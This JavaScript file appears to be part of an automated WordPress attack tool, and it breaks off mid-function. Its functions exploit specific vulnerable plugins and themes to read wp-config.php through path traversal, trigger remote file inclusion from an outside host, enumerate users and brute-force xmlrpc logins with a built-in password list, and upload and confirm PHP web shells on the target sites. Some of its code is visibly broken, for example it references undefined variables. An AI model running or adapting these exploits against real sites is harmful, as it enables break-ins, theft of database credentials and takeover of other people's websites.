const global = require('../functionsglobal')
const log = global.log
var request = require("request");
var senhas = ['admin','admin123','123456','123456789','admin@123','password','demo','root','toor','mudar123','12345678','666666','111111','1234567','qwerty','qwerty','siteadmin','administrator','123123','123321','1234567890','letmein123','test123','demo123','pass123','123qwe','qwe123','654321','loveyou','adminadmin123']
                                    
var headers = { 
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
    'Content-Type' : 'multipart/form-data' 
};

class xploits {
    async  check_social_warfare(url) {
        return new Promise(async function(resolve, reject){
            try {
                var text1 = await global.requestget(url + '/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.fabiocardia.com.br/drupal/VulnXYZ.txt')
                if (text1.indexOf("notronsitexploit") > -1 ) {
                    log('[WordPress]: Config social_warfare'+': '+url+'/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.fabiocardia.com.br/drupal/VulnXYZ.txt',3,false)
                    global.Savelogs(url + '/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.fabiocardia.com.br/drupal/VulnXYZ.txt','WordPressWarfare')
                    resolve(true);
                } else if (text1.indexOf("Erro 500") > -1 ) {
                    log('[WordPress]: Config social_warfare'+': '+url+'/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.fabiocardia.com.br/drupal/VulnXYZ.txt',3,false)
                    global.Savelogs(url + '/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.fabiocardia.com.br/drupal/VulnXYZ.txt','WordPressWarfare')
                    resolve(true);
                } else {
                    log('[WordPress]: Config social_warfare Failed',2)
                    resolve(false);
                }
            } catch(e) {
                log('[WordPress]: Config social_warfare Failed',2)
                resolve(false);
            }
        });
    }

    async  check_revslider_show_image(url) {
        return new Promise(async function(resolve, reject){
            try {
                var text1 = await global.requestget(url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
                if (text1.indexOf("DB_NAME") > -1 ) {
                    log('[WordPress]: Config revslider Success'+': '+url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',3,true)
                    global.Savelogs(url + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php','WordPressConfig')
                    resolve(true);
                } else {
                    log('[WordPress]: Config revslider Failed',2)
                    resolve(false);
                }
            } catch(e) {
                log('[WordPress]: Config revslider Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wd_ads_ads(url) {
        return new Promise(async function(resolve, reject){
            try {
                var text1 = await global.requestget(url + '/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php')
                if (text1.indexOf("DB_NAME") > -1 ) {
                    log('[WordPress]: Config wd_ads_ads Success'+': '+url+'//wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',3,true)
                    global.Savelogs(url + '/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php','WordPressConfig')
                    resolve(true);
                } else {
                    log('[WordPress]: Config wd_ads_ads Failed',2)
                    resolve(false);
                }
            } catch(e) {
                log('[WordPress]: Config wd_ads_ads Failed',2)
                resolve(false);
            }
        });
    }

    async  check_membership(url) {
        return new Promise(async function(resolve, reject){
            try {
                var text1 = await global.requestget(url + '/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php')
                if (text1.indexOf("DB_NAME") > -1 ) {
                    log('[WordPress]: Config membership Success'+': '+url+'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php',3,true)
                    global.Savelogs(url + '/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php','WordPressConfig')
                    resolve(true);
                } else {
                    log('[WordPress]: Config membership Failed',2)
                    resolve(false);
                }
            } catch(e) {
                log('[WordPress]: Config membership Failed',2)
                resolve(false);
            }
        });
    }

    async  check_asgallDownload(url) {
        return new Promise(async function(resolve, reject){
            try {
                var text1 = await global.requestget(url + '/asgallDownload.php?imgname=../../../wp-load.php')
                if (text1.indexOf("ABSPATH") > -1 ) {
                    log('[WordPress]: Config asgallDownload Success'+': '+url+'/asgallDownload.php?imgname=../../../wp-load.php',3,true)
                    global.Savelogs(url + '/asgallDownload.php?imgname=../../../wp-load.php','WordPressConfig')
                    resolve(true);
                } else {
                    log('[WordPress]: Config asgallDownload Failed',2)
                    resolve(false);
                }
            } catch(e) {
                log('[WordPress]: Config asgallDownload Failed',2)
                resolve(false);
            }
        });
    }

    async  check_bruteforce(url) {
        return new Promise(async function(resolve, reject){
            try {
                var text1 = await global.requestget(url + '/wp-json/wp/v2/users')
                if (text1.indexOf("slug") > -1 ) {
                    var usuariostmp = '';
                    await text1.split("{").forEach(async function (item) {
                        if (item.indexOf("slug") > -1 ) {
                            await item.split(",").forEach(async function (item2) {
                                if (item2.indexOf("slug") > -1 &&  item2.length < 100) {
                                    var usuario = item2.replace('"slug":"','').replace('"','')
                                    usuariostmp = usuariostmp + ' : ' + usuario;
                                    var arrurl = url.replace('www.','').split(".");
                                    var tempurl = arrurl[0]
                                    tempurl =tempurl.replace('http://','').replace('https://','')
                                    console.log(tempurl)
                                    senhas.push(tempurl);
                                    await senhas.forEach(async function (password) { 
                                        global.sleep(2000)
                                        try {
                                            var brute = await global.requestpost(url + '/xmlrpc.php',"<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + usuario + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>")
                                            if (brute.indexOf('<methodResponse>') == -1 ) {
                                                return;
                                            }
                                            //console.log(brute)
                                            if (brute.indexOf("isAdmin") > -1 ) {
                                                log('[WordPress]: Admin Success'+': '+url+'/'+ usuario+':'+password,3,true)
                                                global.Savelogs(url + '/'+ usuario + ':' + password,'WordPressAdmin')
                                            } else {
                                                log('[WordPress]: Admin Failed'+': '+url+'/'+ usuario+':'+password,2,false)
                                            }
                                        } catch (error) {
                                        }
                                    })
                                }
                            })
                        }
                    });
                    log('[WordPress]: Brute Success'+': '+url+'/'+ usuariostmp,3,false)
                    global.Savelogs(url + '/wp-json/wp/v2/users'+ usuariostmp,'WordPressBrute')
                    resolve(true);
                } else {
                    log('[WordPress]: Brute Failed',2)
                    resolve(false);
                }
            } catch(e) {
                console.log(e)
                log('[WordPress]: Brute Failed',2)
                resolve(false);
            }
        });
    }

    async  check_bruteforce2(url) {
        return new Promise(async function(resolve, reject){
            try {
                var text1 = await global.requestpost(url + '/?es=export',"option=view_all_subscribers")
                if (text1.indexOf("Confirmed") > -1 ) {
                    
                    global.Savelogs(url + '/?es=export'+ usuariostmp,'WordPressBrute2')
                    resolve(true);
                    //console.log(text1)
                    var usuariostmp = '';
                    await text1.split("{").forEach(async function (item) {
                        if (item.indexOf("slug") > -1 ) {
                            await item.split(",").forEach(async function (item2) {
                                if (item2.indexOf("slug") > -1 ) {
                                    var usuario = item2.replace('"slug":"','').replace('"','')
                                    usuariostmp = usuariostmp + ' : ' + usuario;
                                    var arrurl = url.replace('www.','').split(".");
                                    var tempurl = arrurl[0]
                                    tempurl =tempurl.replace('http://','').replace('https://','')
                                    console.log(tempurl)
                                    senhas.push(tempurl);
                                    await senhas.forEach(async function (password) { 
                                        global.sleep(2000)
                                        try {
                                            var brute = await global.requestpost(url + '/xmlrpc.php',"<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + usuario + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>")
                                            if (brute.indexOf('<methodResponse>') == -1 ) {
                                                return;
                                            }
                                            //console.log(brute)
                                            if (brute.indexOf("isAdmin") > -1 ) {
                                                log('[WordPress]: Admin Success'+': '+url+'/'+ usuario+':'+password,3,true)
                                                global.Savelogs(url + '/'+ usuario + ':' + password,'WordPressAdmin')
                                            } else {
                                                log('[WordPress]: Admin Failed'+': '+url+'/'+ usuario+':'+password,2,false)
                                            }
                                        } catch (error) {
                                        }
                                    })
                                }
                            })
                        }
                    });
                    log('[WordPress]: Brute2 Success'+': '+url+'/'+ usuariostmp,3,false)
                    global.Savelogs(url + '/wp-json/wp/v2/users'+ usuariostmp,'WordPressBrute')
                    resolve(true);
                } else {
                    log('[WordPress]: Brute2 Failed',2)
                    resolve(false);
                }
            } catch(e) {
                console.log(e)
                log('[WordPress]: Brute2 Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_blaze(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'album_img': fs.createReadStream(__dirname + '/tool/VulnXYZ.php'),
                    'task':'blaze_add_new_album',
                    'album_name':'',
                    'album_desc':''
                  };
                  request.post({url: url+"/wp-admin/admin.php?page=blaze_manage", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_blaze Failed',2)
                        resolve(false);
                        return
                    } else {
                        var uploadfolder = string.match("\/uploads\/blaze\/(.*?)\/big\/VulnXYZ.php")
                        var Check = await global.requestget(url + "/wp-content/uploads/blaze/"+uploadfolder+"/big/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_blaze Success'+': '+url+"/wp-content/uploads/blaze/"+uploadfolder+"/big/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/blaze/"+uploadfolder+"/big/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_blaze Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wp_blaze Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_catpro(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'album_img': fs.createReadStream(__dirname + '/tool/VulnXYZ.php'),
                    'task':'cpr_add_new_album',
                    'album_name':'',
                     'album_desc':''
                  };
                  request.post({url: url+"/wp-admin/admin.php?page=catpro_manage", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_catpro Failed',2)
                        resolve(false);
                        return
                    } else {
                        var uploadfolder = string.match("\/uploads\/blaze\/(.*?)\/big\/VulnXYZ.php")
                        var Check = await global.requestget(url + "/wp-content/uploads/catpro/"+uploadfolder+"/big/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_catpro Success'+': '+url+"/wp-content/uploads/catpro/"+uploadfolder+"/big/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/catpro/"+uploadfolder+"/big/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_catpro Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wp_catpro Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_cherry(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'file': fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                  };
                  request.post({url: url+"/wp-content/plugins/cherry-plugin/admin/import-export/upload.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_cherry Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/cherry-plugin/admin/import-export/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_cherry Success'+': '+url+'/wp-content/plugins/cherry-plugin/admin/import-export/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/plugins/cherry-plugin/admin/import-export/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_cherry Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wp_cherry Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_dm(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'upfile': fs.createReadStream(__dirname + '/tool/VulnXYZ.php'),
                    'dm_upload':''
                  };
                  request.post({url: url+"/wp-content/plugins/downloads-manager/upload.php?up="+url+"/wp-content/plugins/downloads-manager/upload/", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_dm Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/downloads-manager/upload/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_dm Success'+': '+url+'/wp-content/plugins/downloads-manager/upload/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/plugins/downloads-manager/upload/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_dm Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wp_dm Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_powerzoomer(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'album_img': fs.createReadStream(__dirname + '/tool/VulnXYZ.php'),
                    'task':'pwz_add_new_album',
                    'album_name':'',
                    'album_desc':''
                  };
                  request.post({url: url+"/wp-admin/admin.php?page=powerzoomer_manage", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_powerzoomer Failed',2)
                        resolve(false);
                        return
                    } else {
                        var uploadfolder = string.match("\/uploads\/powerzoomer\/(.*?)\/big\/VulnXYZ.php")
                        var Check = await global.requestget(url + "/wp-content/uploads/powerzoomer/"+uploadfolder+"/big/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_powerzoomer Success'+': '+url+"/wp-content/uploads/powerzoomer/"+uploadfolder+"/big/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/powerzoomer/"+uploadfolder+"/big/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_powerzoomer Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wp_powerzoomer Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_revslider(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    'action':'revslider_ajax_action',
                    'client_action':'update_plugin',
                    'update_file': fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                  };
                  request.post({url: url+"/wp-admin/admin-ajax.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_revslider Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check1 = await global.requestpost(url + "/wp-content/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check2 = await global.requestget(url + "/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check3 = await global.requestget(url + "/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check4 = await global.requestget(url + "/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check5 = await global.requestget(url + "/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslid.texter/VulnXYZ.php?Vuln=XYZ")
                        var Check6 = await global.requestget(url + "/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check7 = await global.requestget(url + "/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check8 = await global.requestget(url + "/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check9 = await global.requestget(url + "/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check10 = await global.requestget(url + "/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check11 = await global.requestget(url + "/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check12 = await global.requestget(url + "/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        var Check13 = await global.requestget(url + "/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ")
                        
                        if (Check1.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check2.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check3.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check4.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check5.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslid.texter/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslid.texter/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check6.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check7.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check8.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check9.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check10.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check11.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check12.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } else if (Check13.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_revslider Success'+': '+url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ',3,true)
                            global.Savelogs(url + "/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                        } 
                            resolve(false);
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wp_revslider Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_fromcraft(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    files: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                  };
                  request.post({url: url+"/wp-content/plugins/formcraft/file-upload/server/php/", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_fromcraft Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/formcraft/file-upload/server/php/files/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_fromcraft Success'+': '+url+"/wp-content/plugins/formcraft/file-upload/server/php/files/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/formcraft/file-upload/server/php/files/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_fromcraft Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wp_fromcraft Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_jobmanager(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    file: [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.gif')
                    ]
                  };
                  request.post({url: url+"/jm-ajax/upload_file/", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_jobmanager Failed',2)
                        resolve(false);
                        return
                    } else {
                        var data = new Date();
                        var month    = data.getMonth();          // 0-23
                        var year     = data.getFullYear(); 
                        var Check = await global.requestget(url + "/wp-content/uploads/job-manager-uploads/file/"+year+"/"+month+"/VulnXYZ.gif")
                        if (Check.indexOf("IHDR") > -1)  {
                            log('[WordPress]: Upload wp_jobmanager Success'+': '+url+"/wp-content/uploads/job-manager-uploads/file/"+year+"/"+month+"/VulnXYZ.gif",3,true)
                            global.Savelogs(url + "/wp-content/uploads/job-manager-uploads/file/"+year+"/"+month+"/VulnXYZ.gif",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_jobmanager Failed',2)
                            resolve(false);
                        }
                    }
                  });
            } catch(e) {
                log('[WordPress]: Upload wp_jobmanager Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_showbiz(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "action":"showbiz_ajax_action",
                    "client_action":"update_plugin",
                    "update_file": [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                };
                request.post({url: url+"/wp-admin/admin-ajax.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_showbiz Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/showbiz/temp/update_extract/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_showbiz Success'+': '+url+"/wp-content/plugins/showbiz/temp/update_extract/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/showbiz/temp/update_extract/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_showbiz Failed',2)
                            resolve(false);
                        }
                    }
                });
            } catch(e) {
                log('[WordPress]: Upload wp_showbiz Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_synoptic(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "qqfile": [
                        fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                    ]
                };
                request.post({url: url+"/wp-content/themes/synoptic/lib/avatarupload/upload.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[Joolma]: Upload wp_synoptic Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/uploads/markets/avatars/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_synoptic Success'+': '+url+"/wp-content/uploads/markets/avatars/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/markets/avatars/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_synoptic Failed',2)
                            resolve(false);
                        }
                    }
                });
            } catch(e) {
                log('[WordPress]: Upload wp_synoptic Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_shop(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "wpshop_file": fs.createReadStream(__dirname + '/tool/VulnXYZ.php')
                };
                request.post({url: url+"/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_shop Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/uploads/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_shop Success'+': '+url+"/wp-content/uploads/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/uploads/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_shop Failed',2)
                            resolve(false);
                        }
                    }
                });
            } catch(e) {
                log('[WordPress]: Upload wp_shop Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_adsmanager(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "uploadfile": fs.createReadStream(__dirname + '/tool/VulnXYZ.php'),
                    'action':'upload_ad_image',
                    'path':''
                };
                request.post({url: url+"/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_adsmanager Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/plugins/simple-ads-manager/VulnXYZ.php?Vuln=XYZ")
                        if (Check.indexOf("nodexploit") > -1)  {
                            log('[WordPress]: Upload wp_adsmanager Success'+': '+url+"/wp-content/plugins/simple-ads-manager/VulnXYZ.php?Vuln=XYZ",3,true)
                            global.Savelogs(url + "/wp-content/plugins/simple-ads-manager/VulnXYZ.php?Vuln=XYZ",'WordPressShell')
                            resolve(true);
                        } else {
                            log('[WordPress]: Upload wp_adsmanager Failed',2)
                            resolve(false);
                        }
                    }
                });
            } catch(e) {
                log('[WordPress]: Upload wp_adsmanager Failed',2)
                resolve(false);
            }
        });
    }

    async  check_wp_wysija(url) {
        return new Promise(async function(resolve, reject){
            try {
                const formData = {
                    "theme": fs.createReadStream(__dirname + '/tool/VulnXYZ.php'),
                    'overwriteexistingtheme':'on',
                    'action':'themeupload',
                    'submitter':'Upload'
                };
                request.post({url: url+"/wp-admin/admin-post.php?page=wysija_campaigns&action=themes", formData: formData, headers: headers,timeout: 10000},async function optionalCallback(err, httpResponse, body) {
                    if (err) {
                        log('[WordPress]: Upload wp_wysija Failed',2)
                        resolve(false);
                        return
                    } else {
                        var Check = await global.requestget(url + "/wp-content/uploads/wysija/themes/VulnX/VulnXYZ.php?Vuln=XYZ")
